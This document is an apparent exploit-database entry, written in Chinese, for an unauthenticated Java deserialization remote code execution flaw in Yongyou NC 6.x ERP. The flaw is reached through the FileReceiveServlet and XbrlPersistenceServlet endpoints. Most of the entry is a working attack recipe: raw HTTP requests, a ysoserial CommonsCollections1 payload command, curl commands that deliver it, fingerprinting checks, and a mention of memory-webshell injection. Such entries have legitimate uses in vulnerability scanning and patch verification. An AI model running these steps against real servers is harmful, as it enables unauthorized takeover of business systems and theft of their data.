---
id: YONGYOU-NC-DESER-RCE
title: 用友 NC FileReceiveServlet/XbrlPersistence 反序列化 RCE
product: yongyou
vendor: 用友
version_affected: "NC 6.x"
severity: CRITICAL
tags: [rce, deserialization, 无需认证, 国产, erp]
fingerprint: ["用友", "NC", "yongyou", "FileReceiveServlet", "XbrlPersistenceServlet"]
---

## 漏洞描述

用友 NC FileReceiveServlet 和 XbrlPersistenceServlet 接口存在 Java 反序列化漏洞，可利用 Commons Collections 链实现未授权 RCE 或内存马注入。

## 影响版本

- NC 6.x

## 前置条件

- 无需认证
- 需要 ysoserial 工具生成 CommonsCollections 利用链 payload

## 利用步骤

### FileReceiveServlet 反序列化

```http
POST /servlet/FileReceiveServlet HTTP/1.1
Host: target
Content-Type: application/octet-stream

<ysoserial_CommonsCollections_payload>
```

使用 ysoserial 生成 CommonsCollections 利用链 payload 直接 POST。

### XbrlPersistenceServlet 反序列化

```http
POST /servlet/XbrlPersistenceServlet HTTP/1.1
Host: target
Content-Type: application/octet-stream

<ysoserial_CommonsCollections_payload>
```

## Payload

### FileReceiveServlet 反序列化

```bash
# 先用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

curl -s -X POST "http://target/servlet/FileReceiveServlet" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin
```

### XbrlPersistenceServlet 反序列化

```bash
curl -s -X POST "http://target/servlet/XbrlPersistenceServlet" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin
```

## 验证方法

通过 DNSLog 回连或注入内存马后访问确认。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/servlet/FileReceiveServlet"
curl -s -o /dev/null -w "%{http_code}" "http://target/servlet/XbrlPersistenceServlet"
```
